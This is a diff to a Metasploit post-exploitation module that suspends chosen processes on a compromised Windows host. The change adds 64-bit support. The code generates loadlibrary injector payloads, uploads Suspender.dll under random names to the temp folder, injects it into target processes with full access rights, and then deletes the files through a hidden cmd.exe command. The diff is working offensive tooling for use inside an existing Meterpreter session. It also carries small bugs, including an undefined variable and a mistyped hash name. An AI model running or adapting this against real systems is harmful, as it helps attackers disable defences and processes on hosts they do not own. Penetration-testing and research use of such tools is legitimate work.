@@ -7,12 +7,14 @@
 # -> Test x64 support
 
 require 'msf/core'
+require 'msf/core/post/file'
 #require 'msf/core/post/common'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Auxiliary::Report
 		#TODO:  Report the process as suspended.
+	include Msf::Post::File
 	
 	def initialize(info={})
 		super( update_info( info,
@@ -30,7 +32,8 @@ class Metasploit3 < Msf::Post
 				they are listed, and process names, if any, will be translated to pids and appended,
 				in order, to the list of PIDs (however no process will be suspended twice).  The
 				current process in which meterpreter is running is automatically blocked from
-				suspension (for your protection).
+				suspension (for your protection).  The module will automatically detect the process
+				architecture and inject the appropirate dll assuming you have supplied them correctly.
 
 				This module is a port of the meterpreter script of the same name by kerberos, which
 				was inspired by mubix's blog which was inpsired by Didier Stevens' Suspender.dll. },
@@ -58,10 +61,12 @@ class Metasploit3 < Msf::Post
 			#	OptBool.new('UNSUSPEND', [false, 'I am not sure this can be implemented',false]),
 				OptBool.new('USE_DLL', [true,
 					'Do NOT use Suspender.dll, this method might bother AVs',true]),
-				@@suspender = OptPath.new('SUSPENDER_DLL', [false,
-					"Local path to the Suspender.dll, req'd if USE_DLL is true", nil]),
+				@@suspender32 = OptPath.new('SUSPENDER_DLL', [false,
+					"Local path to the 32-bit Suspender.dll, req'd if USE_DLL is true", nil]),
+				@@suspender64 = OptPath.new('SUSPENDER_DLL64', [false,
+					"Local path to the 64-bit dll, req'd if USE_DLL and target OS is 64-bit", nil]),
 				OptBool.new('HALT', [true, 'Halt further suspension if any failure is encountered',
-					false]),
+					false])
 			], self.class)
 	end
 
@@ -81,22 +86,44 @@ class Metasploit3 < Msf::Post
 			print_status "Minimum delay for the DLL method is 1, changing delay to 1"
 			delay = 1
 		end
+		sysinfo = session.sys.config.sysinfo
 		#undo = datastore['UNSUSPEND']
 		tempdir = session.fs.file.expand_path("%TEMP%") || "C:\\"
 		if datastore['USE_DLL']
-			if @@suspender.valid?(datastore['SUSPENDER_DLL'])
-				suspender = datastore['SUSPENDER_DLL']
+			# we need 32-bit suspender.dll to be there regardless of target OS arch as
+			# processes on a 64-bit OS may be either 32 or 64
+			suspenders = {}
+			if @@suspender32.valid?(datastore['SUSPENDER_DLL'])
+				# TODO:  confirm dll's arch
+				suspenders[32] = datastore['SUSPENDER_DLL']
 			else
 				susp_path = ::File.join(Msf::Config.data_directory,'suspender','x86','Suspender.dll')
-				if @@suspender.valid?(susp_path)
-					suspender = susp_path
+				if @@suspender32.valid?(susp_path)
+					suspenders[32] = susp_path
 				else
 					raise OptionValidateError.new('SUSPENDER_DLL'),
-					"Could not find Suspender.dll.  A good location to put Suspender.dll is #{susp_path}"
+					"Could not find 32-bit Suspender.dll.  " +
+					"A good location to put Suspender.dll is #{susp_path}"
+				end
+			end
+			# we don't need to validate 64-bit suspender.dll if target OS isn't 64-bit
+			if sysinfo['Architecture'] =~ /64/
+				if @@suspender64.valid?(datastore['SUSPENDER_DLL64'])
+					# TODO:  confirm dll's arch
+					suspenders[64] = datastore['SUSPENDER_DLL64']
+				else
+					susp_path = ::File.join(Msf::Config.data_directory,'suspender','x64','Suspender.dll')
+					if @@suspender64.valid?(susp_path)
+						suspender[64] = susp_path
+					else
+						raise OptionValidateError.new('SUSPENDER_DLL64'),
+						"Could not find 64-bit Suspender.dll.  " +
+						"A good location to put Suspender.dll is #{susp_path}"
+					end
 				end
 			end
 		end
-		uploadpath = "#{tempdir}\\#{Rex::Text.rand_text_alpha((rand(8)+6))}#{delay.to_s}.dll"
+		
 		@@halt = datastore['HALT']
 
 		# check that pids and/or process names are provided and that pid != 0
@@ -113,16 +140,16 @@ class Metasploit3 < Msf::Post
 		end
 		
 		# validate (& cleanup) pids
-		pids = validate_pids(pids)
+		pids_hash = validate_pids(pids)
 
-		if pids.empty?
-			print_error "No valid pids were supplied.  Exiting."
+		if (pids_hash.nil? or pids_hash.empty?)
+			print_error "No valid pids were found.  Exiting."
 			raise Rex::Script::Completed # should we skip the stack trace on this error state?
 		end
 
 		# proceed based on which method was chosen
 		if datastore['USE_DLL']
-			suspend_using_dll(pids,delay,uploadpath,suspender)
+			suspend_using_dll(pids_hash,delay,tempdir,suspenders)
 		else # use the meterpreter api
 			suspend_using_api(pids,delay)
 		end
@@ -132,39 +159,76 @@ class Metasploit3 < Msf::Post
 		return [] if (processes.class != Array or processes.empty?)
 		pids = []
 		processes.each do |process|
-			pid = client.sys.process[process] # returns first process encountered w/this name
+			# this will return first process encountered w/this name
+			# use the PIDS approach if you have multiple processes with the same name
+			pid = client.sys.process[process]
 			if pid 
 				pids << pid
 				vprint_status "Found PID:  #{pid}"
-			else
+			else 
 				check_halt "Could not find a process with the name #{process}..."
 			end
 		end
 		pids
 	end
 
+	def normalize_arch_to_i(arch)
+		return 32 if arch.to_s =~ /x86$|32/
+		return 64 if arch.to_s =~ /64$/
+		return nil
+	end
+
 	def validate_pids(pids)
+		# takes an array, returns a hash with: {pid => arch}
+		# 		like {1440 => 32, 205 => 64}
 		# do the following to each pid:
 		# - convert to integer
 		# - remove pid 0 to protect the system's stability
 		# - remove the current meterp pid to avoid suspending our own process
+		# - determine the process architecture
 		# - remove redundant entries
-		return [] if (pids.class != Array or pids.empty?)
-		clean_pids = []
-		mypid = client.sys.process.getpid
+		return {} if (pids.class != Array or pids.empty?)
+		clean_pids = {}
+		host_processes = session.sys.process.get_processes
+		if host_processes.length < 1
+			print_error "No running processes found on the target host."
+			return {}
+		end
+		
+		# get the current session pid so we don't suspend it later
+		mypid = session.sys.process.getpid.to_i
+
+		# we convert to integers here separately because we want to uniq this array first so we
+		# can avoid redundant lookups later
+		pids.each_with_index do |pid,idx|
+			next if pid.nil?
+			pids[idx] = pid.to_i
+		end
+		# uniq'ify
+		pids.uniq!
+		# now we look up the pids & arch's & remove bad stuff
 		pids.each do |pid|
 			next if pid.nil?
-			ppid = pid.to_i
-			if ppid == 0
-				check_halt "Found PID 0 in the list, removing..."
-			elsif ppid == mypid.to_i
-				check_halt "Found my own PID in the list, removing..."
+			if pid == 0
+				check_halt "Found PID 0 in the list..."
+				print_status "Removing PID 0 from the list"
+			elsif pid == mypid
+				check_halt "Found my own PID in the list..."
+				print_status "Removing #{pid.to_s} from the list"
 			else
-				clean_pids << pid
+				# find the process with this pid and get it's arch
+				theprocess = host_processes.select {|x| x if x["pid"] == pid}.first
+				if ( theprocess.nil? )
+					check_halt("Could not find a process on the host with pid #{thepid.to_s}...")
+					print_status "Removing #{thepid.to_s} from the list"
+					next
+				else
+					clean_pids[pid] = normalize_arch_to_i(theprocess["arch"])
+				end
 			end
 		end
-		# return unique'ified pids
-		clean_pids.uniq
+		# return clean pids as a hash
+		return clean_pids
 	end
 
 	def check_halt(msg,halt=@@halt)
@@ -185,7 +249,7 @@ class Metasploit3 < Msf::Post
 			pids.each do |pid|
 				select(nil, nil, nil, delay)
 				print_status("Targeting process with PID #{pid}...")
-				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
+				targetprocess = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
 				vprint_status "Suspending threads"
 				targetprocess.thread.each_thread do |x|
     				targetprocess.thread.open(x).suspend
@@ -198,35 +262,61 @@ class Metasploit3 < Msf::Post
 			targetprocess.close if targetprocess
 		end
 	end
-	
-	def suspend_using_dll(pids,delay,uploadpath,suspender)
+
+	def suspend_using_dll(pids,delay,uploadpath,suspenders)
+		# pids should be a hash like { pid => arch, 1025 => 32, 2043 => 64 }
+		# suspenders should be a hash like { arch => dll, 32 => lpath2dll, 64 => lpath2dll64 }
+		ploads = {}
+		uploads = {}
 		begin
-			# Create payload, do this first so we don't have to delete files if this fails
-			vprint_status("Creating dll injector payload...")
-			pay = client.framework.payloads.create("windows/loadlibrary")
-			pay.datastore['DLL'] = uploadpath
-			pay.datastore['EXITFUNC'] = 'thread'
-			raw = pay.generate
+			# Create payloads, do this first so we don't have to delete files if this fails
+			suspenders.each_pair do |arch,dll|
+				if normalize_arch_to_i(arch) == 64
+					vprint_status("Creating 64-bit dll injector payload...")
+					pay = session.framework.payloads.create("windows/x64/loadlibrary")
+					uploads[64] = pay.datastore['DLL'] = 
+						"#{uploadpath}\\#{Rex::Text.rand_text_alpha((rand(3)+7))}#{delay.to_s}.dll"
+					pay.datastore['EXITFUNC'] = 'thread'
+					ploads[64] = pay.generate
+				elsif normalize_arch_to_i(arch) == 32
+					vprint_status("Creating 32-bit dll injector payload...")
+					pay = session.framework.payloads.create("windows/loadlibrary")
+					uploads[32] = pay.datastore['DLL'] = 
+						"#{uploadpath}\\#{Rex::Text.rand_text_alpha((rand(3)+3))}#{delay.to_s}.dll"
+					pay.datastore['EXITFUNC'] = 'thread'
+					ploads[32] = pay.generate
+				else
+					print_error "Did not recognize suspender architecture, expected [32|64]"
+					raise Rex::Script::Completed
+				end
+			end
 		rescue RuntimeError => e
 			print_error("Error generating payload #{e.to_s}, can't continue.")
-			raise Rex::Script::Completedprint_status("Opening process with PID #{pid}...")
+			raise Rex::Script::Completed
 		end
 		begin
-			# Upload suspender to target
-			print_status "Uploading Suspender payload to #{uploadpath}, you'll have to remove this" +
-			" manually as it will be in use until the suspended process is killed " + 
-			"by you or by the system/user but I'll try to remove it anyways"
-			session.fs.file.upload_file("#{uploadpath}", "#{suspender}")
+			# Upload suspender(s) to target
+			print_status "Uploading Suspender payload(s) to:"
+			uploads.each_value do |path|
+				print_line "\t#{path}"
+			end
+			print_status "you'll have to remove the file(s) manually as they will be in use until" + 
+			" the suspended process is killed, but I'll try to remove them anyways"
+			uploads.each_pair do |arch,pay|
+				session.fs.file.upload_file("#{pay}", "#{suspenders[arch]}")
+			end
+			# TODO:  Report file uploads
 			# TODO:  inject directly into memory instead of uploading first
 		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Error uploading Suspender.dll:  #{e.to_s}, can't continue"
+			print_error "Error uploading Suspender.dll payload:  #{e.to_s}, can't continue"
 			raise Rex::Script::Completed
 		end
 		# do injects
 		proc = nil
-		pids.each do |pid|
+		pids.each_pair do |pid,arch|
 			begin
-				print_status("Targeting process with PID #{pid}...")
+				print_status("Targeting the #{arch.to_s}-bit process with PID=#{pid} using #{suspenders[arch]}...")
+				raw = ploads[arch]
 				targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
 				mem = targetprocess.memory.allocate(raw.length + (raw.length % 1024))
 				vprint_status("Injecting payload")
@@ -241,19 +331,32 @@ class Metasploit3 < Msf::Post
 				targetprocess.close if targetprocess
 			end
 		end
-		begin # Attempt clean up
-			print_status("Cleaning up what I can, but you'll likely have to delete ")
-			print_line("#{uploadpath} after you kill the suspended process")
-			# in most situations these attempts won't work so we eat the errors raised
-			session.fs.file.rm(uploadpath) # try to remove using API & using a shell
-			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
-			session.sys.process.execute(
-				"cmd.exe /c attrib -r #{uploadpath} && del #{uploadpath}",nil, {'Hidden' => true}
-			)
-		rescue
-			Rex::Post::Meterpreter::RequestError
-			print_status "Could not remove #{uploadpath} as expected"
+		# Attempt clean up
+		print_status("Cleaning up what I can, but you'll likely have to delete:")
+		uploads.each_value do |up|
+			print_line "\t#{up}"
 		end
+		print_line "\tafter you kill the suspended process(es)"
+		# in most situations these attempts won't work so we eat the errors raised
+		some_files_could_not_be_removed = false
+		uploads.each_value do |up|
+			begin
+				session.fs.file.rm(up) # try to remove using API first
+			rescue Rex::Post::Meterpreter::RequestError
+				some_files_could_not_be_removed = true
+			end
+			# and now the shell if the file still exists
+			#TODO:  put this in a loop so it will keep trying to delete until it succeeds
+			if file_exist?(up)
+				begin
+					session.sys.process.execute(
+						"cmd.exe /c attrib -r #{up} && del #{up}",nil, {'Hidden' => true} )
+				rescue Rex::Post::Meterpreter::RequestError
+					some_files_could_not_be_removed = true
+				end
+			end
+		end
+		print_status "Could not remove some uploaded files as expected" if some_files_could_not_be_removed
 	end
 
 end
